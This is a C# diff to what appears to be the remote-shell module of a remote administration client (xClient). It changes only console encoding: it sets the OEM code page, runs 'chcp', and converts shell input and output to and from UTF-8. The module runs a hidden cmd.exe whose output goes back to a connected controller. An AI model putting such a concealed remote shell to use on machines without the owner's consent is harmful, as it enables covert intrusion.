@@ -36,6 +36,16 @@ namespace xClient.Core.Utilities
         private readonly object _readStreamLock = new object();
 
         /// <summary>
+        /// The current console encoding.
+        /// </summary>
+        private Encoding _encoding;
+
+        /// <summary>
+        /// Redirects commands to the standard input stream of the console with the correct encoding.
+        /// </summary>
+        private StreamWriter _inputWriter;
+
+        /// <summary>
         /// Creates a new session of the Shell
         /// </summary>
         private void CreateSession()
@@ -46,6 +56,7 @@ namespace xClient.Core.Utilities
             }
 
             CultureInfo cultureInfo = CultureInfo.InstalledUICulture;
+            _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage);
 
             _prc = new Process
             {
@@ -55,8 +66,8 @@ namespace xClient.Core.Utilities
                     RedirectStandardInput = true,
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
-                    StandardOutputEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
-                    StandardErrorEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
+                    StandardOutputEncoding = _encoding,
+                    StandardErrorEncoding = _encoding,
                     CreateNoWindow = true,
                     WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                     Arguments = "/K"
@@ -67,6 +78,9 @@ namespace xClient.Core.Utilities
 
             // Fire up the logic to redirect the outputs and handle them.
             RedirectOutputs();
+
+            // Change console code page
+            ExecuteCommand("chcp " + _encoding.CodePage);
 
             new Packets.ClientPackets.DoShellExecuteResponse(Environment.NewLine + ">> New Session created" + Environment.NewLine).Execute(
                 Program.ConnectClient);
@@ -121,7 +135,9 @@ namespace xClient.Core.Utilities
         {
             if (textbuffer.Length == 0) return;
 
-            var toSend = textbuffer.ToString();
+            var text = textbuffer.ToString();
+            byte[] utf8Text = Encoding.Convert(_encoding, Encoding.UTF8, _encoding.GetBytes(text));
+            var toSend = Encoding.UTF8.GetString(utf8Text);
 
             if (string.IsNullOrEmpty(toSend)) return;
 
@@ -231,8 +247,16 @@ namespace xClient.Core.Utilities
 
             if (_prc == null) return false;
 
-            _prc.StandardInput.WriteLine(command);
-            _prc.StandardInput.Flush();
+            if (_inputWriter == null)
+            {
+                _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
+            }
+
+            byte[] rawCommand = Encoding.Convert(Encoding.UTF8, _encoding, Encoding.UTF8.GetBytes(command));
+            string fixedEncodedCommand = _encoding.GetString(rawCommand);
+
+            _inputWriter.WriteLine(fixedEncodedCommand);
+            _inputWriter.Flush();
 
             return true;
         }
@@ -276,6 +300,8 @@ namespace xClient.Core.Utilities
                     {
                     }
                 }
+                _inputWriter.Close();
+                _inputWriter = null;
                 _prc.Dispose();
                 _prc = null;
             }
